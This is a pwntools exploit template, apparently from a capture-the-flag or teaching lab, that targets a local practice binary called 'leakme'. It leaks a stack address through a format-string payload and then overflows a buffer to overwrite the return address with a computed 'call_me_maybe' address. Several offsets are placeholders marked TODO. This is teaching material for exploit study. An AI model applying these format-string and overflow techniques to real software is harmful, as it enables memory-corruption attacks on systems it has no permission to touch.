#!/usr/bin/env python3
from pwn import context, p32, process, gdb, remote
import sys

# quick configuration constants:
BINARY = "./leakme"
REMOTE = False
GDB_ENABLED = not REMOTE

# pwntools debugging goodness
context.log_level = 'info'
context.binary = BINARY

# connect to the docker container?
if REMOTE:
    io = remote('localhost', 31337)
else:
    io = process([BINARY])

# 1. Leak address phase
leak_int_padding = 10  # TODO: check leak output and decide on an offset
# wait until the prompt is printed
io.recvline_contains((b"Please enter your full name"))
# send our first payload to printf-leak the address!
io.sendline((("%p" * leak_int_padding) + "|" + ("%08lX" * 1)).encode("ASCII"))
# read back our leaked memory data!
io.recvline_contains(b"Invalid name")
leaked_data = io.recvline()
print("Leaked line: ", leaked_data)

# TODO: extract leaked address from leaked data
# (as hex string, see below for conversion to int)
leaked_addr_s = "AB1234CD"
print(leaked_addr_s)

# 2. Overflow the *** outta that buffer!
first_name = "X "
# TODO: calculate overflow buffer length
overflow_len = 13 + 4 - len(first_name)  # subtract fname prefix + skip EBP
# TODO: offset between the leaked RET address and the call_me_maybe function
offset = 0x3421 - 0x1234

# put things together
leaked_addr = int(leaked_addr_s, base=16)
call_me_addr = leaked_addr + offset
print("Computed call me addr:", hex(call_me_addr))

print("Sending final exploit!")
# TODO: yep, we can do this to run a specific gdb script from now on!
# though feel free to disable if you have no need for it!
# modify your script below, especially the breakpoint line
if GDB_ENABLED:
    gdb.attach(io, """
    record
    break 56
    continue
    """)
# if anything is wrong, use reverse-nexti inside GDB to reverse execution ;)

# p32 is used to pack our adress as little endian 4-byte string
# e.g.: 0xffffd12c => \x2c\xd1\xff\xff 
# Note: the program expects a space character to separate names!
io.sendline(first_name.encode("ASCII") + (b"A" * overflow_len) + p32(call_me_addr))

# use this to avoid terminating connection (usefull when trying to get shell)
io.interactive()

